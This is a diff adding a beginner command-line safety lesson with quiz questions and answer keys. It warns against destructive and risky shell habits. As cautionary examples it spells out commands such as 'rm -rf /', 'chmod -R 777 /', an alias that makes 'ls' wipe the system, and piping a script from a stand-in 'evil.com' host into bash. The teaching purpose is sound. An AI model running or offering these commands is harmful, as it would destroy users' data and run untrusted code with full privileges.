@@ -1,0 +1,367 @@
+id = "safety-essentials"
+title = "What NOT to Do - Safety Essentials"
+description = "Critical safety lessons to prevent data loss, system damage, and security vulnerabilities. Learn the dangerous commands and practices to avoid."
+difficulty = "Beginner"
+estimated_minutes = 15
+prerequisites = []
+tags = [
+    "beginner",
+    "safety",
+    "essential",
+    "security",
+]
+setup = []
+
+[[steps]]
+step_number = 1
+title = "Welcome to Safety Training"
+instruction = ""
+
+[steps.step_type.Information]
+content = """
+⚠️  IMPORTANT: This lesson teaches you what NOT to do!
+
+The command line is powerful - which means it can do a LOT of damage if misused. Unlike graphical interfaces with confirmation dialogs and trash bins, the terminal executes commands IMMEDIATELY and PERMANENTLY.
+
+In this lesson, you'll learn:
+  • Dangerous commands that can destroy your system
+  • Common mistakes beginners make
+  • Security vulnerabilities to avoid
+  • Best practices for safe command line usage
+
+This knowledge could save you from:
+  • Losing important files forever
+  • Breaking your operating system
+  • Creating security holes
+  • Hours of recovery work
+
+Let's get started! 🛡️"""
+
+[[steps]]
+step_number = 2
+title = "The Most Dangerous Command"
+instruction = ""
+
+[steps.step_type.MultipleChoice]
+question = "Which command is EXTREMELY dangerous and should NEVER be run?"
+options = [
+    "rm -i file.txt",
+    "rm -rf /",
+    "ls -la /",
+    "cd /tmp",
+]
+correct_index = 1
+explanation = "CORRECT! 'rm -rf /' is catastrophic - it recursively force-deletes your ENTIRE system starting from the root! The -r means recursive (all files and folders), -f means force (no confirmations), and / is the root of your entire filesystem. This will destroy your operating system and all your data. Modern systems have protections, but NEVER try this. Even 'rm -rf /*' (with a star) can be devastating!"
+
+[[steps]]
+step_number = 3
+title = "Understanding Force Flags"
+instruction = ""
+
+[steps.step_type.Information]
+content = """
+🚨 NEVER USE FORCE FLAGS UNLESS YOU'RE ABSOLUTELY CERTAIN!
+
+Dangerous force flags to avoid:
+
+  • rm -f      - Deletes without asking (NO confirmation!)
+  • rm -rf     - Recursively force-deletes directories
+  • mv -f      - Overwrites files without warning
+  • cp -f      - Overwrites files without asking
+
+Instead, ALWAYS use interactive flags:
+
+  ✅ rm -i     - Asks before each deletion
+  ✅ rm -ri    - Safe recursive deletion with prompts
+  ✅ mv -i     - Asks before overwriting
+  ✅ cp -i     - Asks before overwriting
+
+Remember: Linux has NO recycle bin. Deleted = GONE FOREVER!
+The -i flag is your safety net. Use it!"""
+
+[[steps]]
+step_number = 4
+title = "Permission Dangers"
+instruction = ""
+
+[steps.step_type.MultipleChoice]
+question = "You need to make a script executable. Which chmod command is safest?"
+options = [
+    "chmod 777 script.sh (everyone can read, write, execute)",
+    "chmod +x script.sh (add execute permission)",
+    "chmod -R 777 / (make everything writable)",
+    "chmod 000 script.sh (remove all permissions)",
+]
+correct_index = 1
+explanation = """
+CORRECT! 'chmod +x script.sh' just adds execute permission safely. 
+
+❌ NEVER use chmod 777! This gives EVERYONE (including attackers) full read, write, and execute access. It's a MASSIVE security hole!
+
+❌ NEVER use chmod -R 777 on system directories! This makes your entire system vulnerable.
+
+Always use minimal permissions:
+  • 755 for directories and executables (owner can write, others can read/execute)
+  • 644 for regular files (owner can write, others can read)
+  • Use +x, +r, +w to add specific permissions instead of numbers"""
+
+[[steps]]
+step_number = 5
+title = "The Sudo Trap"
+instruction = ""
+
+[steps.step_type.Information]
+content = """
+🔐 SUDO GIVES YOU SUPERPOWERS - USE RESPONSIBLY!
+
+Common sudo mistakes:
+
+❌ DON'T: Run random internet commands with sudo
+   Example: Don't blindly copy-paste 'sudo rm -rf /usr'
+
+❌ DON'T: Use sudo just because a command failed
+   Example: If 'npm install' fails, DON'T try 'sudo npm install'
+   (Fix permissions instead!)
+
+❌ DON'T: Pipe untrusted scripts to sudo bash
+   Example: curl http://example.com/script.sh | sudo bash
+   (This runs unknown code as admin!)
+
+✅ DO: Read and understand commands before using sudo
+✅ DO: Use sudo only when actually needed (system changes)
+✅ DO: Check who wrote the script you're running
+
+Think of sudo like giving someone the keys to your house - only do it when absolutely necessary and you trust the command!"""
+
+[[steps]]
+step_number = 6
+title = "Wildcard Disasters"
+instruction = ""
+
+[steps.step_type.MultipleChoice]
+question = "You're in your home directory and want to delete all .txt files. Which is SAFEST?"
+options = [
+    "rm *.txt (could be dangerous if you're in wrong directory!)",
+    "rm -rf *",
+    "First 'ls *.txt' to verify, then 'rm -i *.txt'",
+    "cd / && rm *.txt",
+]
+correct_index = 2
+explanation = """
+CORRECT! Always verify with 'ls' FIRST, then use 'rm -i' for confirmation!
+
+Wildcard disasters to avoid:
+
+❌ 'rm -rf *' - Deletes EVERYTHING in current directory!
+❌ 'rm -rf * .*' - Even worse, includes hidden files!
+❌ 'rm * .txt' - Space before .txt means delete everything AND .txt!
+
+Safety practices:
+  1️⃣  Always 'pwd' to confirm you're in the right directory
+  2️⃣  Always 'ls [pattern]' to see what matches BEFORE deleting
+  3️⃣  Always use 'rm -i' with wildcards
+  4️⃣  Be EXTRA careful with spaces in commands!"""
+
+[[steps]]
+step_number = 7
+title = "Pipe and Redirect Dangers"
+instruction = ""
+
+[steps.step_type.Information]
+content = """
+⚡ REDIRECTS CAN OVERWRITE FILES INSTANTLY!
+
+Dangerous redirects:
+
+❌ command > important.txt
+   • Single > OVERWRITES the file completely!
+   • If command is empty, you just erased your file!
+
+❌ command > /etc/passwd
+   • Overwriting system files breaks your system!
+
+❌ cat file.txt > file.txt
+   • You just erased file.txt with an empty file!
+   • (Can't read and write same file this way)
+
+Safe practices:
+
+✅ command >> file.txt  (double >> appends instead of overwriting)
+✅ Always backup first: cp important.txt important.txt.bak
+✅ Test commands first: command > /tmp/test.txt
+✅ Use 'set -o noclobber' to prevent accidental overwrites
+
+Remember: > is INSTANT and PERMANENT!"""
+
+[[steps]]
+step_number = 8
+title = "Copy-Paste from the Internet"
+instruction = ""
+
+[steps.step_type.MultipleChoice]
+question = "You found a cool command on a random website. What should you do?"
+options = [
+    "Copy-paste it immediately into your terminal",
+    "Add sudo to make sure it works",
+    "Read and understand what each part does, then type it yourself",
+    "Run it in another user's account first",
+]
+correct_index = 2
+explanation = """
+CORRECT! Always READ and UNDERSTAND commands first!
+
+Internet command safety:
+
+❌ Malicious examples you might see:
+   • curl evil.com/script | bash  (runs hidden malware!)
+   • alias ls='rm -rf /'  (makes 'ls' destroy your system!)
+   • Hidden characters that do something different than shown
+
+✅ Safe practices:
+   1️⃣  READ every part of the command
+   2️⃣  Look up unfamiliar commands with 'man' or '--help'
+   3️⃣  TYPE commands yourself (don't copy-paste!)
+   4️⃣  Be skeptical of commands that:
+      • Use sudo unnecessarily
+      • Pipe curl/wget to bash
+      • Have > redirects to system files
+      • Use rm, chmod, or other dangerous commands
+   5️⃣  Only trust official documentation
+
+When in doubt, ask an expert or research more!"""
+
+[[steps]]
+step_number = 9
+title = "File System Navigation Mistakes"
+instruction = ""
+
+[steps.step_type.Information]
+content = """
+🗺️  ALWAYS KNOW WHERE YOU ARE!
+
+Common navigation mistakes:
+
+❌ Running destructive commands without checking location:
+   pwd  ← Always do this first!
+   # Oh no, I'm in / not /tmp!
+
+❌ Typos in paths with destructive commands:
+   cd /tmpp/work     ← Failed (typo)
+   rm -rf *          ← Just deleted wrong directory!
+
+❌ Assuming you're in the right directory:
+   cd ~/projects/myapp
+   # ...later...
+   rm -rf node_modules  ← Are you still in myapp?
+
+Safe practices:
+
+✅ Always 'pwd' before destructive operations
+✅ Use absolute paths for important operations:
+   rm -rf /tmp/test instead of cd /tmp && rm -rf test
+✅ Use tab completion to avoid typos
+✅ Create a habit: 'pwd' → 'ls' → then act
+✅ Be extra careful in /tmp, /, and system directories"""
+
+[[steps]]
+step_number = 10
+title = "Hidden Files and Spaces in Names"
+instruction = ""
+
+[steps.step_type.Information]
+content = '''
+👻 WATCH OUT FOR HIDDEN FILES AND SPACES!
+
+Hidden file dangers:
+
+❌ rm -rf * → Deletes visible files only
+❌ rm -rf * .* → DANGEROUS! .* matches .. (parent directory!)
+✅ rm -rf * .[^.]* → Safe way to include hidden files
+
+Spaces in filenames:
+
+❌ rm my file.txt → Tries to delete 'my' and 'file.txt'
+✅ rm "my file.txt" → Correct (quotes protect spaces)
+✅ rm my\ file.txt → Also correct (backslash escapes space)
+✅ Use tab completion to auto-escape spaces!
+
+Other tricky characters:
+
+❌ Files starting with - (dash) confuse commands:
+   rm -file.txt → Thinks it's a flag!
+   ✅ rm ./-file.txt → Correct way
+
+❌ Files with special characters: !@#$%^&*()
+   ✅ Always use quotes or escape them
+
+Best practice: Avoid spaces in filenames! Use underscores or dashes:
+  my-file.txt or my_file.txt'''
+
+[[steps]]
+step_number = 11
+title = "Environment Variable Dangers"
+instruction = ""
+
+[steps.step_type.Information]
+content = """
+🔧 BE CAREFUL WITH ENVIRONMENT VARIABLES!
+
+Dangerous modifications:
+
+❌ export PATH=/usr/bin
+   • Overwrites entire PATH (breaks most commands!)
+   ✅ export PATH=$PATH:/usr/bin (appends instead)
+
+❌ unset PATH
+   • Makes most commands unusable!
+
+❌ Adding untrusted directories to PATH:
+   export PATH=/tmp:$PATH
+   • Now malicious /tmp/ls could run instead of real ls!
+
+System file dangers:
+
+❌ NEVER edit these without understanding them:
+   • /etc/passwd → User accounts
+   • /etc/fstab → Disk mounting (can prevent boot!)
+   • /etc/hosts → Network resolution
+   • /boot/* → Boot files (can break booting!)
+
+✅ Safe practices:
+   • Always backup before editing: sudo cp /etc/passwd /etc/passwd.bak
+   • Use proper editors: sudo vi /etc/hosts
+   • Test changes in your home directory first
+   • Keep recovery USB drive handy!"""
+
+[[steps]]
+step_number = 12
+title = "Completion: Safety Knowledge Acquired!"
+instruction = ""
+
+[steps.step_type.Information]
+content = """
+🎓 CONGRATULATIONS! You're now aware of major dangers!
+
+🛡️  GOLDEN RULES TO REMEMBER:
+
+1️⃣  NEVER run 'rm -rf /' or 'rm -rf /*'
+2️⃣  ALWAYS use -i flag with rm, mv, cp
+3️⃣  NEVER use chmod 777 on anything
+4️⃣  ALWAYS read commands before running them
+5️⃣  NEVER blindly copy-paste from the internet
+6️⃣  ALWAYS pwd before destructive operations
+7️⃣  NEVER pipe curl to bash without reading the script
+8️⃣  ALWAYS use sudo minimally and carefully
+9️⃣  NEVER assume you're in the right directory
+🔟 ALWAYS backup important files before operations
+
+💡 When in doubt:
+  • man <command> → Read the manual
+  • <command> --help → Get help info
+  • Ask in forums/communities
+  • Test in /tmp or virtual machine first
+  • Make backups before experimenting
+
+Stay safe and enjoy the power of the command line! 🚀
+
+Next: Practice these lessons in safe environments!"""
